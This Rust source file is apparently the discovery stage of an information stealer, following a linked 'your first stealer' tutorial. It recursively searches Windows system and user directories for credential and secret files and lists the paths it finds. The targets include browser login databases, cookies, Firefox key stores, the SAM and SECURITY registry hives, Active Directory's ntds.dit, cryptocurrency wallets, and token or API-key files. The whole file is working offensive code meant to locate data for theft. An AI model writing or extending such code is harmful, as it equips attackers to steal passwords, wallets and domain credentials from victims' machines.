// awwrf awwrf wwwrrff! >:3
// https://om.malcore.io/t/finding-common-sensitive-files-on-a-windows-machine-your-first-stealer

use regex::Regex;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};
use walkdir::{DirEntry, WalkDir};

const DIRECTORIES: &[&str] = &[
    "C:\\Users",
    "C:\\ProgramData",
    "C:\\Windows\\System32",
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
    "C:\\AppData",
    "C:\\Documents and Settings",
];

const PASSWORD_FILES: &[&str] = &[
    // browsers
    "Login Data", // chromium-based browsers
    "Login Data For Opera",
    "logins.json", // firefox
    "key3.db",     // firefox encr keys
    "key4.db",
    "signons.sqlite", // older firefox
    "Web Data",       // chrome autofill
    "Cookies",
    "Credential Locker", // WCM
    // windows files
    "SAM", // secuwity accouwnt manawer
    "SYSTEM",
    "SECURITY",
    "software",
    "ntds.dit", // AD database uwu
    "passwords.dat",
    "user.dat",
    "defaultuser0", // default user profile
    "user.key",
    // crypto
    "wallet.dat", // bitcoin
    "keystore",   // ethereum
    "wallet.json",
    "wallet.dat.bak",
    "keys.json",
    "private.key",
    "privkeys.dat",
    "accounts.dat",
    // common files
    "passwords.xml",
    "credentials.json",
    "config.yaml",
    "config.json",
    "credentials.xml",
    "settings.ini",
    "secrets.toml",
    "auth.db",
    "tokens.dat",
    "securestorage.sqlite",
    "vault.json",
    "password_store",
    "pass.json",
    "api_keys.json",
    "database.sqlite",
    "databases.db",
    "db.sqlite",
    "db.json",
    "user_credentials.json",
    "secure.txt",
    "encrypted.dat",
    "protected.dat",
    "private_storage.bin",
];

fn is_password_file(entry: &DirEntry, patterns: &Regex) -> bool {
    if let Some(file_name) = entry.file_name().to_str() {
        patterns.is_match(file_name)
    } else {
        false
    }
}

fn main() {
    let escaped_patterns: Vec<String> = PASSWORD_FILES.iter().map(|s| regex::escape(s)).collect();
    let pattern = format!(r"^(?i)({})$", escaped_patterns.join("|"));
    let regex = match Regex::new(&pattern) {
        Ok(r) => r,
        Err(e) => {
            //eprintln!("invalid regex pattern: {}", e);
            return;
        }
    };

    let mut found_files: Vec<PathBuf> = Vec::new();
    let mut inaccessible_paths: Vec<PathBuf> = Vec::new();

    for dir in DIRECTORIES {
        let walker = WalkDir::new(dir).follow_links(false).into_iter();

        for entry in walker {
            match entry {
                Ok(entry) => {
                    if entry.file_type().is_file() {
                        if is_password_file(&entry, &regex) {
                            found_files.push(entry.path().to_path_buf());
                        }
                    }
                }
                Err(e) => {
                    if let Some(path) = e.path() {
                        inaccessible_paths.push(path.to_path_buf());
                        //eprintln!("cannot access {}: {}", path.display(), e);
                    } else {
                        eprintln!("without a path: {}", e);
                    }
                }
            }
        }
    }

    if found_files.is_empty() {
        println!("no common files found.");
    } else {
        println!("\nfound the following files:");
        for file in &found_files {
            println!("{}", file.display());
        }
        println!("\ntotal files found: {}", found_files.len());
    }

    if !inaccessible_paths.is_empty() {
        println!("\n({} invalid paths).", inaccessible_paths.len());
    }
}
